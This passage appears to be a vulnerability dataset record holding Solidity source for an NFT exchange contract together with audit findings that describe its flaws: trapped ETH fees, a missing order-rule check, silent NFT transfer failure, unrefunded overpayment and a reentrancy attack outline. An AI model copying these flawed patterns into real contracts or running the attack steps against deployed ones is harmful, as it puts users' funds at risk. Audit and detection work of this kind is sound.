help reduce contract size a bit and avoid any stack too deep errors\n  function _execMatchOrder(\n    address seller,\n    address buyer,\n    uint256 sellNonce,\n    uint256 buyNonce,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    address currency,\n    uint256 amount\n  ) internal {\n    // Update order execution status to true (prevents replay)\n    isUserOrderNonceExecutedOrCancelled[seller][sellNonce] = true;\n    isUserOrderNonceExecutedOrCancelled[buyer][buyNonce] = true;\n    _transferMultipleNFTs(seller, buyer, constructedNfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(currency).safeTransferFrom(buyer, seller, amount);\n  }\n\n  function _emitMatchEvent(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    address seller,\n    address buyer,\n    address complication,\n    address currency,\n    uint256 amount\n  ) internal {\n    emit MatchOrderFulfilled(sellOrderHash, buyOrderHash, seller, buyer, complication, currency, amount);\n  }\n\n  /**\n   * @notice Internal helper function to take orders\n   * @dev verifies whether order can be executed\n   * @param makerOrder the maker order\n   * @param takerItems nfts to be transferred\n   * @param execPrice execution price\n   */\n  function _takeOrders(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.OrderItem[] calldata takerItems,\n    uint256 execPrice\n  ) internal {\n    bytes32 makerOrderHash = _hash(makerOrder);\n    bool makerOrderValid = isOrderValid(makerOrder, makerOrderHash);\n    bool executionValid = IComplication(makerOrder.execParams[0]).canExecTakeOrder(makerOrder, takerItems);\n    require(makerOrderValid && executionValid, 'order not verified');\n    _execTakeOrders(makerOrderHash, makerOrder, takerItems, makerOrder.isSellOrder, execPrice);\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers \n              for take orders specifying a higher order intent\n   * @dev Updates order nonce state, does asset transfers and emits events\n   * @param makerOrderHash maker order hash\n   * @param makerOrder the maker order\n   * @param takerItems nfts to be transferred\n   * @param isMakerSeller is the maker order a sell order\n   * @param execPrice execution price\n   */\n  function _execTakeOrders(\n    bytes32 makerOrderHash,\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.OrderItem[] calldata takerItems,\n    bool isMakerSeller,\n    uint256 execPrice\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n    if (isMakerSeller) {\n      _transferNFTsAndFees(makerOrder.signer, msg.sender, takerItems, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, makerOrder.signer, msg.sender, makerOrder, execPrice);\n    } else {\n      _transferNFTsAndFees(msg.sender, makerOrder.signer, takerItems, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, msg.sender, makerOrder.signer, makerOrder, execPrice);\n    }\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers \n              for simple take orders\n   * @dev Updates order nonce state, does asset transfers and emits events\n   * @param makerOrderHash maker order hash\n   * @param makerOrder the maker order\n   * @param isMakerSeller is the maker order a sell order\n   * @param execPrice execution price\n   */\n  function _execTakeOneOrder(\n    bytes32 makerOrderHash,\n    OrderTypes.MakerOrder calldata makerOrder,\n    bool isMakerSeller,\n    uint256 execPrice\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n    if (isMakerSeller) {\n      _transferNFTsAndFees(makerOrder.signer, msg.sender, makerOrder.nfts, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, makerOrder.signer, msg.sender, makerOrder, execPrice);\n    } else {\n      _transferNFTsAndFees(msg.sender, makerOrder.signer, makerOrder.nfts, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, msg.sender, makerOrder.signer, makerOrder, execPrice);\n    }\n  }\n\n  function _emitTakerEvent(\n    bytes32 orderHash,\n    address seller,\n    address buyer,\n    OrderTypes.MakerOrder calldata order,\n    uint256 amount\n  ) internal {\n    emit TakeOrderFulfilled(orderHash, seller, buyer, order.execParams[0], order.execParams[1], amount);\n  }\n\n  /**\n   * @notice Transfers NFTs and fees\n   * @param seller the seller\n   * @param buyer the buyer\n   * @param nfts nfts to transfer\n   * @param amount amount to transfer\n   * @param currency currency of the transfer\n   */\n  function _transferNFTsAndFees(\n    address seller,\n    address buyer,\n    OrderTypes.OrderItem[] calldata nfts,\n    uint256 amount,\n    address currency\n  ) internal {\n    // transfer NFTs\n    _transferMultipleNFTs(seller, buyer, nfts);\n    // transfer fees\n    _transferFees(seller, buyer, amount, currency);\n  }\n\n  /**\n   * @notice Transfers multiple NFTs in a loop and ERC1155s in a batch\n   * @param from the from address\n   * @param to the to address\n   * @param nfts nfts to transfer\n   */\n  function _transferMultipleNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem[] calldata nfts\n  ) internal {\n    uint256 numNfts = nfts.length;\n    for (uint256 i = 0; i < numNfts; ) {\n      _transferNFTs(from, to, nfts[i]);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   * @notice Transfer NFTs\n   * @param from address of the sender\n   * @param to address of the recipient\n   * @param item item to transfer\n   */\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    }\n  }\n\n  /**\n   * @notice Transfer ERC721s\n   * @param from address of the sender\n   * @param to address of the recipient\n   * @param item item to transfer\n   */\n  function _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   * @notice Transfer ERC1155s\n   * @dev uses the ERC1155 batchTransfer function for efficient transfers\n   * @param from address of the sender\n   * @param to address of the recipient\n   * @param item item to transfer\n   */\n  function _transferERC1155s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numNfts = item.tokens.length;\n    uint256[] memory tokenIdsArr = new uint256[](numNfts);\n    uint256[] memory numTokensPerTokenIdArr = new uint256[](numNfts);\n    for (uint256 i = 0; i < numNfts; ) {\n      tokenIdsArr[i] = item.tokens[i].tokenId;\n      numTokensPerTokenIdArr[i] = item.tokens[i].numTokens;\n      unchecked {\n        ++i;\n      }\n    }\n    IERC1155(item.collection).safeBatchTransferFrom(from, to, tokenIdsArr, numTokensPerTokenIdArr, '0x0');\n  }\n\n  /**\n   * @notice Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is \n            the one that actually 'pays' the fees\n   * @dev if the currency ETH, no additional transfer is needed to pay exchange fees since the contract is 'payable'\n   * @param seller the seller\n   * @param buyer the buyer\n   * @param amount amount to transfer\n   * @param currency currency of the transfer\n   */\n  function _transferFees(\n    address seller,\n    address buyer,\n    uint256 amount,\n    address currency\n  ) internal {\n    // protocol fee\n    uint256 protocolFee = (PROTOCOL_FEE_BPS * amount) / 10000;\n    uint256 remainingAmount = amount - protocolFee;\n    // ETH\n    if (currency == address(0)) {\n      // transfer amount to seller\n      (bool sent, ) = seller.call{value: remainingAmount}('');\n      require(sent, 'failed to send ether to seller');\n    } else {\n      // transfer final amount (post-fees) to seller\n      IERC20(currency).safeTransferFrom(buyer, seller, remainingAmount);\n      // send fee to protocol\n      IERC20(currency).safeTransferFrom(buyer, address(this), protocolFee);\n    }\n  }\n\n  // =================================================== UTILS ==================================================================\n\n  /// @dev Gets current order price for orders that vary in price over time (dutch and reverse dutch auctions)\n  function _getCurrentPrice(OrderTypes.MakerOrder calldata order) internal view returns (uint256) {\n    (uint256 startPrice, uint256 endPrice) = (order.constraints[1], order.constraints[2]);\n    uint256 duration = order.constraints[4] - order.constraints[3];\n    uint256 priceDiff = startPrice > endPrice ? startPrice - endPrice : endPrice - startPrice;\n    if (priceDiff == 0 || duration == 0) {\n      return startPrice;\n    }\n    uint256 elapsedTime = block.timestamp - order.constraints[3];\n    uint256 PRECISION = 10**4; // precision for division; similar to bps\n    uint256 portionBps = elapsedTime > duration ? PRECISION : ((elapsedTime * PRECISION) / duration);\n    priceDiff = (priceDiff * portionBps) / PRECISION;\n    return startPrice > endPrice ? startPrice - priceDiff : startPrice + priceDiff;\n  }\n\n  /// @dev hashes the given order with the help of _nftsHash and _tokensHash\n  function _hash(OrderTypes.MakerOrder calldata order) internal pure returns (bytes32) {\n    // keccak256('Order(bool isSellOrder,address signer,uint256[] constraints,OrderItem[] nfts,address[] execParams,bytes extraParams)OrderItem(address collection,TokenInfo[] tokens)TokenInfo(uint256 tokenId,uint256 numTokens)')\n    bytes32 ORDER_HASH = 0x7bcfb5a29031e6b8d34ca1a14dd0a1f5cb11b20f755bb2a31ee3c4b143477e4a;\n    return\n      keccak256(\n        abi.encode(\n          ORDER_HASH,\n          order.isSellOrder,\n          order.signer,\n          keccak256(abi.encodePacked(order.constraints)),\n          _nftsHash(order.nfts),\n          keccak256(abi.encodePacked(order.execParams)),\n          keccak256(order.extraParams)\n        )\n      );\n  }\n\n  function _nftsHash(OrderTypes.OrderItem[] calldata nfts) internal pure returns (bytes32) {\n    // keccak256('OrderItem(address collection,TokenInfo[] tokens)TokenInfo(uint256 tokenId,uint256 numTokens)')\n    bytes32 ORDER_ITEM_HASH = 0xf73f37e9f570369ceaab59cef16249ae1c0ad1afd592d656afac0be6f63b87e0;\n    uint256 numNfts = nfts.length;\n    bytes32[] memory hashes = new bytes32[](numNfts);\n    for (uint256 i = 0; i < numNfts; ) {\n      bytes32 hash = keccak256(abi.encode(ORDER_ITEM_HASH, nfts[i].collection, _tokensHash(nfts[i].tokens)));\n      hashes[i] = hash;\n      unchecked {\n        ++i;\n      }\n    }\n    bytes32 nftsHash = keccak256(abi.encodePacked(hashes));\n    return nftsHash;\n  }\n\n  function _tokensHash(OrderTypes.TokenInfo[] calldata tokens) internal pure returns (bytes32) {\n    // keccak256('TokenInfo(uint256 tokenId,uint256 numTokens)')\n    bytes32 TOKEN_INFO_HASH = 0x88f0bd19d14f8b5d22c0605a15d9fffc285ebc8c86fb21139456d305982906f1;\n    uint256 numTokens = tokens.length;\n    bytes32[] memory hashes = new bytes32[](numTokens);\n    for (uint256 i = 0; i < numTokens; ) {\n      bytes32 hash = keccak256(abi.encode(TOKEN_INFO_HASH, tokens[i].tokenId, tokens[i].numTokens));\n      hashes[i] = hash;\n      unchecked {\n        ++i;\n      }\n    }\n    bytes32 tokensHash = keccak256(abi.encodePacked(hashes));\n    return tokensHash;\n  }\n\n  // ====================================================== ADMIN FUNCTIONS ======================================================\n\n  /// @dev used for rescuing exchange fees paid to the contract in tokens\n  function rescueTokens(\n    address destination,\n    address currency,\n    uint256 amount\n  ) external onlyOwner {\n    IERC20(currency).safeTransfer(destination, amount);\n  }\n\n  /// @dev used for rescuing exchange fees paid to the contract in ETH\n  function rescueETH(address destination) external payable onlyOwner {\n    (bool sent, ) = destination.call{value: msg.value}('');\n    require(sent, 'failed');\n  }\n\n  /// @dev adds a new transaction currency to the exchange\n  function addCurrency(address _currency) external onlyOwner {\n    _currencies.add(_currency);\n  }\n\n  /// @dev adds a new complication to the exchange\n  function addComplication(address _complication) external onlyOwner {\n    _complications.add(_complication);\n  }\n\n  /// @dev removes a transaction currency from the exchange\n  function removeCurrency(address _currency) external onlyOwner {\n    _currencies.remove(_currency);\n  }\n\n  /// @dev removes a complication from the exchange\n  function removeComplication(address _complication) external onlyOwner {\n    _complications.remove(_complication);\n  }\n\n  /// @dev updates auto snipe executor\n  function updateMatchExecutor(address _matchExecutor) external onlyOwner {\n    MATCH_EXECUTOR = _matchExecutor;\n  }\n\n  /// @dev updates the gas units required for WETH transfers\n  function updateWethTranferGas(uint32 _wethTransferGasUnits) external onlyOwner {\n    WETH_TRANSFER_GAS_UNITS = _wethTransferGasUnits;\n    emit NewWethTransferGasUnits(_wethTransferGasUnits);\n  }\n\n  /// @dev updates exchange fees\n  function setProtocolFee(uint16 _protocolFeeBps) external onlyOwner {\n    PROTOCOL_FEE_BPS = _protocolFeeBps;\n    emit NewProtocolFee(_protocolFeeBps);\n  }\n}\n\n\n",
        "CodeNames": [
            "InfinityExchange.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-04",
                "Location": [
                    "//solidity\n  /\n   * @notice Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is \n            the one that actually 'pays' the fees\n   * @dev if the currency ETH, no additional transfer is needed to pay exchange fees since the contract is 'payable'\n   * @param seller the seller\n   * @param buyer the buyer\n   * @param amount amount to transfer\n   * @param currency currency of the transfer\n   */\n  function _transferFees(\n    address seller,\n    address buyer,\n    uint256 amount,\n    address currency\n  ) internal {\n    // protocol fee\n    uint256 protocolFee = (PROTOCOL_FEE_BPS * amount) / 10000;\n    uint256 remainingAmount = amount protocolFee;\n    // ETH\n    if (currency == address(0)) {\n      // transfer amount to seller\n      (bool sent, ) = seller.call{value: remainingAmount}('');\n      require(sent, 'failed to send ether to seller');\n",
                    "//solidity\n  /// @dev used for rescuing exchange fees paid to the contract in ETH\n  function rescueETH(address destination) external payable onlyOwner {\n    (bool sent, ) = destination.call{value: msg.value}('');\n    require(sent, 'failed');\n  }\n"
                ],
                "Type": " Accumulated ETH fees of InfinityExchange cannot be retrieved",
                "Description": "\nETH fees accumulated from takeOrders() and takeMultipleOneOrders() operations are permanently frozen within the contract as there is only one way designed to retrieve them, a rescueETH() function, and it will work as intended, not being able to access ETH balance of the contract.\n\nSetting the severity as high as the case is a violation of system's core logic and a permanent freeze of ETH revenue of the project.\n\n\nFees are accrued in user-facing takeOrders() and takeMultipleOneOrders() via the following call sequences:\n\n    takeOrders - _takeOrders - _execTakeOrders - _transferNFTsAndFees - _transferFees\n    takeMultipleOneOrders - _execTakeOneOrder - _transferNFTsAndFees - _transferFees\n\nWhile token fees are transferred right away, ETH fees are kept with the InfinityExchange contract:\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1119-L1141\n\nsolidity\n  /\n   * @notice Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is \n            the one that actually 'pays' the fees\n   * @dev if the currency ETH, no additional transfer is needed to pay exchange fees since the contract is 'payable'\n   * @param seller the seller\n   * @param buyer the buyer\n   * @param amount amount to transfer\n   * @param currency currency of the transfer\n   */\n  function _transferFees(\n    address seller,\n    address buyer,\n    uint256 amount,\n    address currency\n  ) internal {\n    // protocol fee\n    uint256 protocolFee = (PROTOCOL_FEE_BPS * amount) / 10000;\n    uint256 remainingAmount = amount protocolFee;\n    // ETH\n    if (currency == address(0)) {\n      // transfer amount to seller\n      (bool sent, ) = seller.call{value: remainingAmount}('');\n      require(sent, 'failed to send ether to seller');\n\n\ni.e. when currency is ETH the fee part of the amount, protocolFee, is left with the InfinityExchange contract.\n\nThe only way to retrieve ETH from the contract is rescueETH() function:\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232\n\nsolidity\n  /// @dev used for rescuing exchange fees paid to the contract in ETH\n  function rescueETH(address destination) external payable onlyOwner {\n    (bool sent, ) = destination.call{value: msg.value}('');\n    require(sent, 'failed');\n  }\n\n\nHowever, it cannot reach ETH on the contract balance as msg.value is used as the amount to be sent over. I.e. only ETH attached to the rescueETH() call is transferred from owner to destination. ETH funds that InfinityExchange contract holds remain inaccessible.\n\n",
                "Repair": "\nConsider adding contract balance to the funds transferred:\n\nsolidity\n  /// @dev used for rescuing exchange fees paid to the contract in ETH\n  function rescueETH(address destination) external payable onlyOwner {\n  (bool sent, ) = destination.call{value: msg.value}('');\n+   (bool sent, ) = destination.call{value: address(this).balance}('');\n    require(sent, 'failed');\n  }\n\n\nnneverlander (Infinity) confirmed(https://github.com/code-423n4/2022-06-infinity-findings/issues/296) \n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-06-infinity-findings/issues/296#issuecomment-1179570179):\n  When an order is filled using ETH, the exchange collects fees by holding them in the contract for later withdraw. However the only withdraw mechanism does not work so that ETH becomes trapped forever.\n \n This is a High risk issue since some ETH is lost with each ETH based trade.\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-05",
                "Location": [
                    "Complication",
                    "makerOrders",
                    "takeMultipleOneOrders"
                ],
                "Type": " Missing Complication check in  takeMultipleOneOrders ",
                "Description": "\nAn order's type and it's rules are defined in it's Complication. Not checking it would allow anyone to take any orders regardless of their Complication's rule, causing unexpected execution for order makers.\n\ntakeMultipleOneOrders assumes that all makerOrders are simple orderbook orders and the  Complication check is missing here.\n\n\n*   Alice signs a makerOrder with PrivateSaleComplication, allowing only Bob to take the private sale order.\n*   A malicious trader calls takeMultipleOneOrders to take Alice's order, despite the Complication only allowing Bob to take it.\n\n",
                "Repair": "\nAdd canExecTakeOneOrder function in IComplication.sol and implement it in InfinityOrderBookComplication (and future Complications) to support takeMultipleOneOrders operation, then modify takeMultipleOneOrders to use the check:\n\n    function takeMultipleOneOrders() {\n        ...\n        for (uint256 i = 0; i < numMakerOrders; ) {\n            bytes32 makerOrderHash = _hash(makerOrders[i]);\n            bool makerOrderValid = isOrderValid(makerOrders[i], makerOrderHash);\n            bool executionValid = IComplication(makerOrders[i].execParams[0]).canExecTakeOneOrder(makerOrders[i]);\n            \n            require(makerOrderValid && executionValid, 'order not verified');\n            \n            require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');\n            require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');\n            uint256 execPrice = _getCurrentPrice(makerOrders[i]);\n            totalPrice += execPrice; // @audit-issue missing complication check\n            _execTakeOneOrder(makerOrderHash, makerOrders[i], isMakerSeller, execPrice);\n            unchecked {\n                ++i;\n            }\n        }\n        ...\n    }\n\nnneverlander (Infinity) confirmed and resolved(https://github.com/code-423n4/2022-06-infinity-findings/issues/125#issuecomment-1162936193):\n  fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/0b7608a2c9efc71d902a9c90f4731ef434b42c31.\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-06-infinity-findings/issues/125#issuecomment-1179806203):\n  takeMultipleOneOrders does not check restrictions set via the Complication. Agree with the High risk assessment here.\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-07",
                "Location": [
                    "_transferNFTs()",
                    "supportsInterface()"
                ],
                "Type": "  _transferNFTs()  succeeds even if no transfer is performed",
                "Description": "\nIf an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. In doing so, the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This could happen in the following cases:\n\n1.  A token that claims to be ERC-721/1155 compliant, but fails to implement the supportsInterface() function properly.\n2.  An NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces.\n3.  A malicious contract that is deployed to take advantage of this behavior.\n\n\n<https://gist.github.com/kylriley/3bf0e03d79b3d62dd5a9224ca00c4cb9\n\n",
                "Repair": "\nIf neither the ERC-721 nor the ERC-1155 interface is supported the function should revert. An alternative approach would be to attempt a transferFrom and check the balance before and after to ensure that it succeeded.\n\nnneverlander (Infinity) confirmed and resolved(https://github.com/code-423n4/2022-06-infinity-findings/issues/87#issuecomment-1162963184):\n  Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/377c77f0888fea9ca1e087de701b5384a046f760\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-06-infinity-findings/issues/87#issuecomment-1179596601):\n If supportsInterface returns false for both 721 & 1155 then no NFT is transferred but funds are still sent to the seller.\n \n A number of NFTs do not fully comply with the 721/1155 standards. Since the order is not canceled or the tx reverted, this seems like a High risk issue.\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-08",
                "Location": [
                    "//solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value = totalPrice, 'invalid total price');\n    }\n",
                    "//solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value = totalPrice, 'invalid total price');\n    }\n"
                ],
                "Type": " Overpayment of native ETH is not refunded to buyer",
                "Description": "\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L119-L121\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232\n\n\nInfinityExchange accepts payments in native ETH, but does not return overpayments to the buyer. Overpayments are likely in the case of auction orders priced in native ETH.\n\nIn the case of a Dutch or reverse Dutch auction priced in native ETH, the end user is likely to send more ETH than the final calculated price in order to ensure their transaction succeeds, since price is a function of block.timestamp, and the user cannot predict the timestamp at which their transaction will be included.\n\nIn a Dutch auction, final price may decrease below the calculated price at the time the transaction is sent. In a reverse Dutch auction, the price may increase above the calculated price by the time a transaction is included, so the buyer is incentivized to provide additional ETH in case the price rises while their transaction is waiting for inclusion.\n\nThe takeOrders and takeMultipleOneOrders functions both check that the buyer has provided an ETH amount greater than or equal to the total price at the time of execution:\n\nInfinityExchange#takeOrders(https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363)\n\nsolidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value = totalPrice, 'invalid total price');\n    }\n\n\nInfinityExchange#takeMultipleOneOrders(https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327)\n\nsolidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value = totalPrice, 'invalid total price');\n    }\n\n\nHowever, neither of these functions refunds the user in the case of overpayment. Instead, overpayment amounts will accrue in the contract balance.\n\nMoreover, since there is a bug in rescueETH that prevents ether withdrawals from InfinityExchange, these overpayments will be locked permanently: the owner cannot withdraw and refund overpayments manually.\n\nScenario:\n\n*   Alice creates a sell order for her token with constraints that set up a reverse Dutch auction: start price 500, end price 2000, start time 1, end time 5.\n*   Bob fills the order at time 2. The calculated price is 875. Bob is unsure when his transaction will be included, so provides a full 2000 wei payment.\n*   Bob's transaction is included at time 3. The calculated price is 1250.\n*   Bob's additional 750 wei are locked in the contract and not refunded.\n\nSuggestion: Calculate and refund overpayment amounts to callers.\n\nnneverlander (Infinity) confirmed and resolved(https://github.com/code-423n4/2022-06-infinity-findings/issues/244#issuecomment-1160526998):\n  Agree with the assessment, fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/a605b72e44256aee76d80ae1652e5c98c855ffd3\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-06-infinity-findings/issues/244#issuecomment-1179719920):\n  In the case of a Dutch auction, precise pricing is unknown at the time a tx is broadcasted. This leads to users overpaying and the surplus is taken as exchange fees instead of being refunded.\n \n Accepting as a High risk submission.\n\n\n\n*\n\n\n",
                "Repair": ""
            },
            {
                "Name": "H-11",
                "Location": [
                    "takeOrders",
                    "matchOneToManyOrders",
                    "nonReentrant"
                ],
                "Type": " Reentrancy from  matchOneToManyOrders ",
                "Description": "\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L178\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L216\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L230\n\n\nmatchOneToManyOrders doesn't conform to Checks-Effects-Interactions pattern, and updates the maker order nonce only after the NFTs and payment have been sent.\nUsing this, a malicious user can re-enter the contract and re-fulfill the order using takeOrders.\n\n\nOrders can be executed twice. User funds would be lost.\n\n\nmatchOneToManyOrders will set the order nonce as used only after the tokens are being sent:\n\n      function matchOneToManyOrders(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.MakerOrder[] calldata manyMakerOrders) external {\n        ...\n        if (makerOrder.isSellOrder) {\n          for (uint256 i = 0; i < ordersLength; ) {\n            ...\n            _matchOneMakerSellToManyMakerBuys(...); // @audit will transfer tokens in here\n            ...\n          }\n          //@audit setting nonce to be used only here\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n        } else {\n          for (uint256 i = 0; i < ordersLength; ) {\n            protocolFee += _matchOneMakerBuyToManyMakerSells(...); // @audit will transfer tokens in here\n            ...\n          }\n          //@audit setting nonce to be used only here\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n          ...\n      }\n\nSo we can see that tokens are being transferred before nonce is being set to executed.\n\nTherefore, POC for an attack -\nAlice wants to buy 2 unspecified WolfNFT, and she will pay via AMP, an ERC-777 token.\nMalicious user Bob will set up an offer to sell 2 WolfNFT.\nThe MATCH_EXECUTOR will match the offers.\nBob will set up a contract such that upon receiving of AMP, it will call takeOrders(https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L336) with Alice's order, and 2 other WolfNFTs.\n(Note that although takeOrders is nonReentrant, matchOneToManyOrders is not, and so the reentrancy will succeed.)\n\nSo in takeOrders, the contract will match Alice's order with Bob's NFTs, and then set Alice's order's nonce to true, then matchOneToManyOrders execution will resume, and again will set Alice's order's nonce to true.\n\nAlice ended up buying 4 WolfNFTs although she only signed an order for 2. Tough luck, Alice.\n\n(Note: a similar attack can be constructed via ERC721's onERC721Received.)\n\n",
                "Repair": "\nConform to CEI and set the nonce to true before executing external calls.\n\nnneverlander (Infinity) confirmed and resolved(https://github.com/code-423n4/2022-06-infinity-findings/issues/184#issuecomment-1162891402):\n  Fixed in: https://github.com/infinitydotxyz/exchange-contracts-v2/commit/b90e746fa7af13037e7300b58df46457a026c1ac\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-06-infinity-findings/issues/184#issuecomment-1179805097):\n  Great catch! Agree with the assessment.\n\n\n\n*\n\n \n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\n\n// external imports\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\nimport {ReentrancyGuard} from '@openzeppelin/contracts/security/ReentrancyGuard.sol';\nimport {IERC165} from '@openzeppelin/contracts/interfaces/IERC165.sol';\nimport {IERC721} from '@openzeppelin/contracts/token/ERC721/IERC721.sol';\nimport {IERC1155} from '@openzeppelin/contracts/token/ERC1155/IERC1155.sol';\nimport {IERC20, SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\nimport {EnumerableSet} from '@openzeppelin/contracts/utils/structs/EnumerableSet.sol';\n\n// internal imports\nimport {OrderTypes} from '../libs/OrderTypes.sol';\nimport {IComplication} from '../interfaces/IComplication.sol';\nimport {SignatureChecker} from '../libs/SignatureChecker.sol';\n\n/**\n@title InfinityExchange\n@author nneverlander. Twitter @nneverlander\n@notice The main NFT exchange contract that holds state and does asset transfers\n@dev This contract can be extended via 'complications' - strategies that let the exchange execute various types of orders\n      like dutch auctions, reverse dutch auctions, floor price orders, private sales, etc.\n\nNFTNFTNFT...........................................NFTNFTNFT\nNFTNFT                                                 NFTNFT\nNFT                                                       NFT\n.                                                           .\n.                                                           .\n.                                                           .\n.                                                           .\n.               NFTNFTNFT            NFTNFTNFT              .\n.            NFTNFTNFTNFTNFT      NFTNFTNFTNFTNFT           .\n.           NFTNFTNFTNFTNFTNFT   NFTNFTNFTNFTNFTNFT         .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.          NFTNFTNFTNFTNFTNFTN   NFTNFTNFTNFTNFTNFT         .\n.            NFTNFTNFTNFTNFT      NFTNFTNFTNFTNFT           .\n.               NFTNFTNFT            NFTNFTNFT              .\n.                                                           .\n.                                                           .\n.                                                           .\n.                                                           .\nNFT                                                       NFT\nNFTNFT                                                 NFTNFT\nNFTNFTNFT...........................................NFTNFTNFT \n\n*/\ncontract InfinityExchange is ReentrancyGuard, Ownable {\n  using SafeERC20 for IERC20;\n  using EnumerableSet for EnumerableSet.AddressSet;\n\n  /// @dev WETH address of a chain; set at deploy time to the WETH address of the chain that this contract is deployed to\n  address public immutable WETH;\n  /// @dev Used in order signing with EIP-712\n  bytes32 public immutable DOMAIN_SEPARATOR;\n  /// @dev This is the adress that is used to send auto sniped orders for execution on chain\n  address public MATCH_EXECUTOR;\n  /// @dev Gas cost for auto sniped orders are paid by the buyers and refunded to this contract in the form of WETH\n  uint32 public WETH_TRANSFER_GAS_UNITS = 50000;\n  /// @notice Exchange fee in basis points (250 bps = 2.5%)\n  uint16 public PROTOCOL_FEE_BPS = 250;\n\n  /**\n   @dev All orders should have a nonce >= to this value. \n        Any orders with nonce value less than this are non-executable. \n        Used for cancelling all outstanding orders.\n  */\n  mapping(address => uint256) public userMinOrderNonce;\n\n  /// @dev This records already executed or cancelled orders to prevent replay 